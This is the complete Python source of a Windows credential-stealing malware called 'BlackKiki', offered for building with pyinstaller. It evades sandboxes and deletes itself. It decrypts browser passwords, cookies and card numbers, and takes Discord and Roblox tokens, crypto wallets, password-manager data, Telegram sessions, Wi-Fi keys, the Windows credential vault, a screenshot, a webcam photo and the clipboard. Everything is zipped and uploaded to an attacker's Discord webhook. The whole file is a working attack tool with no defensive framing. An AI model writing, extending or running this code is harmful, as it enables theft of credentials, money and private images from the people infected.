# Compile using:
# pyinstaller main.py --onefile --noconsole --clean --name BlackKiki --icon=icon.ico --hidden-import=pygame --hidden-import=pygame.camera --hidden-import=win32crypt --hidden-import=win32clipboard --hidden-import=win32api --hidden-import=winreg --hidden-import=win32security --hidden-import=win32file --hidden-import=win32process --hidden-import=win32event --hidden-import=psutil --hidden-import=Crypto.Cipher.AES --hidden-import=PIL --hidden-import=PIL.ImageGrab --collect-all pygame --collect-all PIL --noupx

# ------------------------------------
# BlackKiki V1.7
# ------------------------------------
# Changes:
# IMPORTANT -> Use the builder.py file for creation
# Added webhook error ignoring
# Added more paths
# Added so more data is stolen
# Changed up patterns even more
# Changed names
# ------------------------------------
# ------------------------------------
import os,sys,json,base64,sqlite3,shutil,tempfile,zipfile,requests,platform,socket,getpass,datetime,subprocess,re,time,glob,ctypes,hashlib,threading,random,string,win32crypt,win32clipboard,winreg,psutil,win32api,win32net,win32gui,win32con,win32netcon
from Crypto.Cipher import AES
from PIL import ImageGrab
import pygame
import pygame.camera
import uuid
import netifaces
import fontTools.ttLib

W = base64.b64decode("YOUR_BASE64_ENCODED_DISCORD_WEBHOOK").decode(errors="ignore")

B = {k:os.path.expandvars(v) for k,v in {
    "c":r"%LOCALAPPDATA%\Google\Chrome\User Data",
    "e":r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    "b":r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    "o":r"%APPDATA%\Opera Software\Opera Stable",
    "v":r"%LOCALAPPDATA%\Vivaldi\User Data",
    "y":r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data",
    "g":r"%APPDATA%\Opera Software\Opera GX Stable",
    "cent":r"%LOCALAPPDATA%\CentBrowser\User Data",
    "ungoog":r"%LOCALAPPDATA%\Ungoogled Chromium\User Data",
    "comodo":r"%LOCALAPPDATA%\Comodo\Dragon\User Data",
    "torch":r"%LOCALAPPDATA%\Torch\User Data",
    "maxthon":r"%LOCALAPPDATA%\Maxthon\User Data",
    "avast":r"%LOCALAPPDATA%\Avast Software\Browser\User Data",
    "iron":r"%LOCALAPPDATA%\SRWare Iron\User Data"
}.items()}

E = [
    "nkbihfbeogaeaoehlefnkodbefgpgknn","bfnaelmomeimhlpmgjnjophhpkkoljpa","fnjhmkhhmkbjkkabndcnnogagogbneec",
    "egjidjbpglichdcondbcbdnbeeppgdph","afbcbjlebbfndgpncekmhgkgejipdpek","acmacodkjbdgmoleebolmdjonilkdbch",
    "hnmpcagpplmpfojmgmnngilbnojdjame","dmkamcknogkgcdfhhbddcghachkejeap","mkpegjkblkkefacfnmkajcjmabijhclg",
    "aflkmfnggphgkfghjpejdhkchfhmkfbm","kpfopkelmapcoipemfendmdcghnegimn","fhilaheimglignddkjgofkcbgekhenbh",
    "gighmmpiobklfepjocnamgkkbiglidom","odbfpeeihdkbihmopkbjmoonfanlbfcl","ljfojbdoifdehngjlljckjdbmlgibkco",
    "efiddehhebakdebbpaochppbikppgjfh","hnakjeefjcbjdbjdminilmddffnibkde","aohghmighlieiainmgojcjpncpbepo",
    "klghhnkeealcohjjanjjdgcolligpngt","fhilaheimglignddkjgofkcbgekhenbh","klghhnkeealcohjjanjjdgcolligpngt"
]

def rnds(): return ''.join(random.choices(string.hexdigits.lower(),k=6))

def vmc():
    score = 0
    vm_procs = {"vboxservice","vmtoolsd","vboxtray","vmwaretray","wireshark","ollydbg","x32dbg","x64dbg","procmon","procexp","fiddler","autoruns","processhacker","ida64","ghidra","radare2","sandboxie","cuckoo","anydesk","teamviewer","virtualbox","qemu","hyperv","parallels"}
    for p in psutil.process_iter(['name']):
        try:
            if p.info['name'].lower() in vm_procs: score += 3
        except: pass
    vm_paths = [r"C:\windows\system32\drivers\VBoxMouse.sys",r"C:\windows\system32\drivers\vmhgfs.sys",r"C:\Program Files\Oracle\VirtualBox Guest Additions",r"C:\Program Files\VMware\VMware Tools",r"C:\Program Files\QEMU",r"C:\Program Files\Parallels\Parallels Tools"]
    for p in vm_paths:
        if os.path.exists(p): score += 2
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
        v,_ = winreg.QueryValueEx(k,"0")
        winreg.CloseKey(k)
        if any(w in v.lower() for w in ["vbox","vmware","qemu","virtual","hyper","parallel"]): score += 4
    except: pass
    if os.cpu_count() is not None and os.cpu_count() <= 2: score += 2
    try:
        mem = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
        if mem.value < 4*1024*1024*1024: score += 2
    except: pass
    if "virtual" in platform.machine().lower() or "vmware" in platform.processor().lower(): score += 3
    return score >= 8

def sd():
    if sys.platform!="win32": return
    try:
        p = sys.executable if getattr(sys,'frozen',False) else os.path.abspath(sys.argv[0])
        t = os.path.join(tempfile.gettempdir(),f"rm_{rnds()}.bat")
        with open(t,"w") as f: f.write(f'@echo off\ntimeout /t {random.randint(5,10)} >nul\ndel /f /q "{p}" >nul 2>&1\ndel "%~f0" >nul 2>&1\n')
        subprocess.Popen(['cmd','/c',t],creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
    except: pass

def kb():
    names = ["chrome","msedge","brave","opera","vivaldi","yandex-browser","firefox","opera_gx","centbrowser","torch","maxthon","dragon","avastbrowser","iron"]
    for n in names:
        try: subprocess.run(f'taskkill /im {n}.exe /f >nul 2>&1',shell=True,timeout=random.uniform(2.5,4))
        except: pass
    time.sleep(random.uniform(0.3,0.7))

def gmk(p):
    try:
        with open(os.path.join(p,"Local State"),"r",encoding="utf-8") as f:
            key_data = json.load(f)["os_crypt"]["encrypted_key"]
            key = base64.b64decode(key_data)[5:]
        return win32crypt.CryptUnprotectData(key,None,None,None,0)[1]
    except: return b""

def dv(v,m):
    try:
        if len(v)<15: return ""
        iv = v[3:15]
        ct = v[15:-16]
        tag = v[-16:]
        cipher = AES.new(m,AES.MODE_GCM,iv)
        return cipher.decrypt_and_verify(ct,tag).decode(errors="replace")
    except: return ""

def cdb(s,t):
    time.sleep(random.uniform(0.05,0.15))
    try:
        if os.path.exists(s): shutil.copy2(s,t); return True
    except: pass
    return False

def sp(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"Login Data")
        tmp=os.path.join(o,f"{l}_{pr}_logdb_{rnds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT action_url,username_value,password_value FROM logins")
                lines=[f"{u}:::{usr}:::{dv(pw,m)}" for u,usr,pw in cur.fetchall() if dv(pw,m)]
                if lines: open(os.path.join(o,f"{l}_{pr}_logins.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass
    time.sleep(random.uniform(0.2,0.4))

def sc(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        for p in [os.path.join(r,pr,"Network","Cookies"),os.path.join(r,pr,"Cookies")]:
            if not os.path.exists(p): continue
            tmp=os.path.join(o,f"{l}_{pr}_netdb_{rnds()}.db")
            if cdb(p,tmp):
                try:
                    c=sqlite3.connect(tmp)
                    cur=c.cursor()
                    cur.execute("SELECT host_key,name,encrypted_value FROM cookies")
                    lines=[f"{h}:::{na}:::{dv(ev,m)}" for h,na,ev in cur.fetchall() if dv(ev,m)]
                    if lines: open(os.path.join(o,f"{l}_{pr}_netdata.txt"),"w",encoding="utf-8").write("\n".join(lines))
                except: pass

def saf(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"Web Data")
        tmp=os.path.join(o,f"{l}_{pr}_formdb_{rnds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT name,value FROM autofill")
                lines=[f"{n}:::{v}" for n,v in cur.fetchall() if v]
                if lines: open(os.path.join(o,f"{l}_{pr}_forms.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def scc(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"Web Data")
        tmp=os.path.join(o,f"{l}_{pr}_carddb_{rnds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
                lines=[f"{n}:::{m}/{y}:::{dv(e,m)}" for n,m,y,e in cur.fetchall() if dv(e,m)]
                if lines: open(os.path.join(o,f"{l}_{pr}_cards.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def sh(r,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"History")
        tmp=os.path.join(o,f"{l}_{pr}_visdb_{rnds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT url,title,visit_time FROM urls ORDER BY visit_time DESC LIMIT 500")
                lines=[f"{u}:::{ti}:::{vt}" for u,ti,vt in cur.fetchall()]
                if lines: open(os.path.join(o,f"{l}_{pr}_visits.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def sdw(r,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"History")
        tmp=os.path.join(o,f"{l}_{pr}_dldb_{rnds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT target_path,tab_url FROM downloads ORDER BY start_time DESC LIMIT 200")
                lines=[f"{tp}:::{tu}" for tp,tu in cur.fetchall()]
                if lines: open(os.path.join(o,f"{l}_{pr}_dl.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def sdt(o):
    paths=[os.path.join(os.getenv("APPDATA"),a,"Local Storage","leveldb") for a in ["discord","discordcanary","discordptb","lightcord"]]
    for br in B.values():
        if os.path.exists(br): paths.append(os.path.join(br,"Default","Local Storage","leveldb"))
    t=set()
    rx=r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}'
    mfa_rx=r'mfa\.[\w-]{84}'
    for p in paths:
        if not os.path.exists(p): continue
        for ext in [".log",".ldb",".dat"]:
            for f in glob.glob(os.path.join(p,f"*{ext}")):
                try:
                    with open(f,errors="ignore") as ff:
                        content = ff.read()
                        for x in re.findall(rx,content): t.add(x)
                        for y in re.findall(mfa_rx,content): t.add(y)
                except: pass
    if t: open(os.path.join(o,"dtokens.txt"),"w",encoding="utf-8").write("\n".join(t))

def srt(o):
    paths=[os.path.join(os.getenv("LOCALAPPDATA"),a,"Local Storage","leveldb") for a in ["roblox","robloxstudio"]]
    for br in B.values():
        if os.path.exists(br): paths.append(os.path.join(br,"Default","Local Storage","leveldb"))
    t=set()
    rx=r'[\w-]{64,}'
    for p in paths:
        if not os.path.exists(p): continue
        for ext in [".log",".ldb",".json"]:
            for f in glob.glob(os.path.join(p,f"*{ext}")):
                try:
                    with open(f,errors="ignore") as ff:
                        content = ff.read()
                        if ".ROBLOSECURITY" in content or "roblox" in content.lower():
                            for x in re.findall(rx,content): t.add(x)
                except: pass
    rb=os.path.join(os.getenv("APPDATA"),"Roblox")
    if os.path.exists(rb):
        try:
            for f in glob.glob(os.path.join(rb,"**","*.json"),recursive=True):
                with open(f,"r",errors="ignore") as ff:
                    data = json.load(ff)
                    if "auth" in data or "token" in data: t.add(json.dumps(data))
        except: pass
    if t: open(os.path.join(o,"rtokens.txt"),"w",encoding="utf-8").write("\n".join(t))

def sst(o):
    s=os.path.expandvars(r"%PROGRAMFILES(x86)%\Steam")
    if os.path.exists(s):
        try: shutil.copytree(s,os.path.join(o,"steamx_"+rnds()),dirs_exist_ok=True,ignore=shutil.ignore_patterns("*.log","*.dmp"))
        except: pass

def sep(o):
    e=os.path.expandvars(r"%PROGRAMDATA%\Epic")
    if os.path.exists(e):
        try: shutil.copytree(e,os.path.join(o,"epicx_"+rnds()),dirs_exist_ok=True)
        except: pass

def sbn(o):
    b=os.path.expandvars(r"%PROGRAMDATA%\Battle.net")
    if os.path.exists(b):
        try: shutil.copytree(b,os.path.join(o,"battlenetx_"+rnds()),dirs_exist_ok=True)
        except: pass

def sri(o):
    ri=os.path.expandvars(r"%PROGRAMDATA%\Riot Games")
    if os.path.exists(ri):
        try: shutil.copytree(ri,os.path.join(o,"riotx_"+rnds()),dirs_exist_ok=True)
        except: pass

def stg(o):
    t=os.path.join(os.getenv("APPDATA"),"Telegram Desktop","tdata")
    if os.path.exists(t):
        try: shutil.copytree(t,os.path.join(o,"telegramx_"+rnds()),dirs_exist_ok=True,ignore=shutil.ignore_patterns("*.lock","cache*"))
        except: pass

def sw(o):
    wd=os.path.join(o,"vaultx_"+rnds())
    os.makedirs(wd,exist_ok=True)
    for ext in E:
        for br in B.values():
            if not os.path.exists(br): continue
            ep=os.path.join(br,"Default","Local Extension Settings",ext)
            if os.path.exists(ep):
                try: shutil.copytree(ep,os.path.join(wd,ext[:8]+"_"+rnds()),dirs_exist_ok=True)
                except: pass
    dw={
        "exodus":os.path.join(os.getenv("APPDATA"),"Exodus"),
        "atomic":os.path.join(os.getenv("APPDATA"),"atomic"),
        "electrum":os.path.join(os.getenv("APPDATA"),"Electrum","wallets"),
        "coinomi":os.path.join(os.getenv("APPDATA"),"Coinomi"),
        "guarda":os.path.join(os.getenv("APPDATA"),"Guarda"),
        "ledger":os.path.join(os.getenv("APPDATA"),"Ledger Live"),
        "trezor":os.path.join(os.getenv("APPDATA"),"Trezor Suite"),
        "wasabi":os.path.join(os.getenv("APPDATA"),"WalletWasabi"),
        "mymonero":os.path.join(os.getenv("APPDATA"),"MyMonero"),
        "zengo":os.path.join(os.getenv("APPDATA"),"Zengo"),
        "bluewallet":os.path.join(os.getenv("APPDATA"),"BlueWallet"),
        "sparrow":os.path.join(os.getenv("APPDATA"),"Sparrow")
    }
    for n,p in dw.items():
        if os.path.exists(p):
            try: shutil.copytree(p,os.path.join(wd,n+"_"+rnds()),dirs_exist_ok=True)
            except: pass
    pm={
        "bitwarden":os.path.join(os.getenv("APPDATA"),"Bitwarden"),
        "1password":os.path.join(os.getenv("APPDATA"),"1Password"),
        "keepass":os.path.join(os.getenv("APPDATA"),"KeePass"),
        "lastpass":os.path.join(os.getenv("APPDATA"),"LastPass"),
        "nordpass":os.path.join(os.getenv("APPDATA"),"Nord Security\NordPass"),
        "dashlane":os.path.join(os.getenv("APPDATA"),"Dashlane"),
        "roboform":os.path.join(os.getenv("APPDATA"),"Siber Systems\RoboForm")
    }
    for n,p in pm.items():
        if os.path.exists(p):
            try: shutil.copytree(p,os.path.join(wd,"pm_"+n+"_"+rnds()),dirs_exist_ok=True)
            except: pass

def sia(o):
    try:
        k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        apps=[]
        i=0
        while True:
            try:
                sub=winreg.EnumKey(k,i)
                sk=winreg.OpenKey(k,sub)
                try: 
                    name=winreg.QueryValueEx(sk,"DisplayName")[0]
                    vers=winreg.QueryValueEx(sk,"DisplayVersion")[0]
                    inst=winreg.QueryValueEx(sk,"InstallLocation")[0]
                    apps.append(f"{name}:::{vers}:::{inst}")
                except: pass
                winreg.CloseKey(sk)
                i+=1
            except: break
        winreg.CloseKey(k)
        if apps: open(os.path.join(o,"softlist_"+rnds()+".txt"),"w",encoding="utf-8").write("\n".join(sorted(set(apps))))
    except: pass

def spr(o):
    try:
        procs=[]
        for p in psutil.process_iter(['name','pid','username','cpu_percent','memory_percent','exe']):
            try: procs.append(f"{p.info['name']}:::{p.info['pid']}:::{p.info['username']}:::{p.info['cpu_percent']}:::{p.info['memory_percent']}:::{p.info['exe']}")
            except: pass
        if procs: open(os.path.join(o,"procdata_"+rnds()+".txt"),"w",encoding="utf-8").write("\n".join(procs))
    except: pass

def ssi(o):
    try: ip=requests.get("https://api.ipify.org",timeout=5).text
    except: ip="x"
    macs = []
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface).get(netifaces.AF_LINK)
        if addrs: macs.append(addrs[0]['addr'])
    fonts_count = len(glob.glob(r"C:\Windows\Fonts\*.ttf")) + len(glob.glob(r"C:\Windows\Fonts\*.otf"))
    av_procs = [p.info['name'] for p in psutil.process_iter(['name']) if any(av in p.info['name'].lower() for av in ["msmpeng","avast","avg","bitdefender","kaspersky","mcafee","norton","sophos","symantec","trendmicro","windowsdefender","malwarebytes"])]
    info=[
        f"user:{getpass.getuser()}",
        f"host:{socket.gethostname()}",
        f"ip:{ip}",
        f"os:{platform.platform()}",
        f"release:{platform.release()}",
        f"version:{platform.version()}",
        f"arch:{platform.machine()}",
        f"cpu:{platform.processor()}",
        f"cores:{os.cpu_count()}",
        f"ram:{psutil.virtual_memory().total//(1024**3)}GB",
        f"gpu:{win32api.GetSystemMetrics(0)}x{win32api.GetSystemMetrics(1)}",
        f"drives:{[d.mountpoint for d in psutil.disk_partitions()]}",
        f"macs:{';'.join(macs)}",
        f"fonts:{fonts_count}",
        f"av:{';'.join(av_procs)}",
        f"time:{datetime.datetime.now()}",
        f"uuid:{str(uuid.uuid4())}"  # fake uuid for pattern break
    ]
    open(os.path.join(o,"devinfo_"+rnds()+".txt"),"w",encoding="utf-8").write("\n".join(info))

def ss(o):
    try: ImageGrab.grab().save(os.path.join(o,"viscap_"+rnds()+".png"))
    except: pass

def swc(o):
    try:
        pygame.camera.init()
        cams=pygame.camera.list_cameras()
        if cams:
            cam=pygame.camera.Camera(cams[0],(800,600))
            cam.start()
            time.sleep(0.5)
            img=cam.get_image()
            pygame.image.save(img,os.path.join(o,"viscam_"+rnds()+".jpg"))
            cam.stop()
    except: pass

def clb():
    try:
        win32clipboard.OpenClipboard()
        data=win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)
    except: return ""

def swf(o):
    try:
        outp=subprocess.check_output("netsh wlan show profiles",shell=True).decode(errors="ignore")
        profiles=[line.split(":")[1].strip() for line in outp.split("\n") if "All User Profile" in line]
        res=[]
        for pr in profiles:
            try:
                cmd=f'netsh wlan show profile name="{pr}" key=clear'
                out=subprocess.check_output(cmd,shell=True).decode(errors="ignore")
                for line in out.split("\n"):
                    if "Key Content" in line: res.append(f"{pr}:::{line.split(':')[1].strip()}")
                    if "SSID name" in line: res.append(f"{line.strip()}")
            except: pass
        if res: open(os.path.join(o,"netcon_"+rnds()+".txt"),"w",encoding="utf-8").write("\n".join(res))
    except: pass

def scrd(o):
    try:
        subprocess.run("vaultcmd /listcreds:\"Windows Credentials\" /all > credlist.txt",shell=True)
        shutil.move("credlist.txt",os.path.join(o,"credvault_"+rnds()+".txt"))
    except: pass

def spsh(o):
    psh=os.path.join(os.getenv("APPDATA"),"Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
    if os.path.exists(psh):
        try: shutil.copy2(psh,os.path.join(o,"pshist_"+rnds()+".txt"))
        except: pass

def srf(o):
    rec=os.path.join(os.getenv("APPDATA"),"Microsoft\Windows\Recent")
    if os.path.exists(rec):
        try: shutil.copytree(rec,os.path.join(o,"recentx_"+rnds()),dirs_exist_ok=True)
        except: pass

def sua(o):
    uas=[]
    for br in B.values():
        if not os.path.exists(br): continue
        for pr in ["Default"]+[d for d in os.listdir(br) if d.startswith("Profile ")]:
            prefs=os.path.join(br,pr,"Preferences")
            if os.path.exists(prefs):
                try:
                    with open(prefs,"r",encoding="utf-8") as f:
                        data=json.load(f)
                        ua = data.get("custom_user_agent",data.get("user_agent_override",{}).get("user_agent","default"))
                        uas.append(f"{br.split('\\')[-2]}::{pr}:::{ua}")
                except: pass
    if uas: open(os.path.join(o,"agents_"+rnds()+".txt"),"w",encoding="utf-8").write("\n".join(uas))

def main():
    if vmc(): sd(); return
    kb()
    tmp=tempfile.mkdtemp(prefix="core_")
    bd=os.path.join(tmp,"datacore_"+rnds()); os.makedirs(bd,exist_ok=True)
    wd=os.path.join(tmp,"keyvault_"+rnds()); os.makedirs(wd,exist_ok=True)
    md=os.path.join(tmp,"syscache_"+rnds()); os.makedirs(md,exist_ok=True)
    ssi(md)
    open(os.path.join(md,"databuf_"+rnds()+".txt"),"w",encoding="utf-8").write(clb())
    ss(md)
    swc(md)
    swf(md)
    sia(md)
    spr(md)
    scrd(md)
    spsh(md)
    srf(md)
    sua(md)
    for k,n in [("c","Chrome"),("e","Edge"),("b","Brave"),("o","Opera"),("v","Vivaldi"),("y","Yandex"),("g","OperaGX"),("cent","Cent"),("ungoog","Ungoogled"),("comodo","Comodo"),("torch","Torch"),("maxthon","Maxthon")]:
        p=B.get(k,"")
        if not os.path.exists(p): continue
        mk=gmk(p)
        if mk:
            sp(p,mk,bd,n)
            sc(p,mk,bd,n)
            saf(p,mk,bd,n)
            scc(p,mk,bd,n)
            sh(p,bd,n)
            sdw(p,bd,n)
    sdt(md)
    srt(md)
    sst(md)
    sep(md)
    sbn(md)
    sri(md)
    stg(md)
    sw(md)
    zf=os.path.join(tempfile.gettempdir(),f"blackkiki_{getpass.getuser()}_{int(time.time())}.zip")
    with zipfile.ZipFile(zf,"w",zipfile.ZIP_DEFLATED) as zf_:
        for rt,_,fs in os.walk(tmp):
            for fn in fs:
                p=os.path.join(rt,fn)
                zf_.write(p,os.path.relpath(p,tmp)+"_"+rnds())
    u=getpass.getuser()
    try: ip=requests.get("https://api.ipify.org",timeout=5).text
    except: ip="x"
    requests.post(W,json={"content":f"**BlackKiki** → {u} @ {ip}","embeds":[{"title":"BlackKiki Grabber","description":f"User: {u}\nIP: {ip}\nOS: {platform.platform()}\nTime: {datetime.datetime.now()}","color":0x111111}]})
    with open(zf,"rb") as f: requests.post(W,files={"file":(f"blackkiki_{u}.zip",f,"application/zip")})
    try: shutil.rmtree(tmp); os.remove(zf)
    except: pass
    sd()

if __name__=="__main__":
    main()
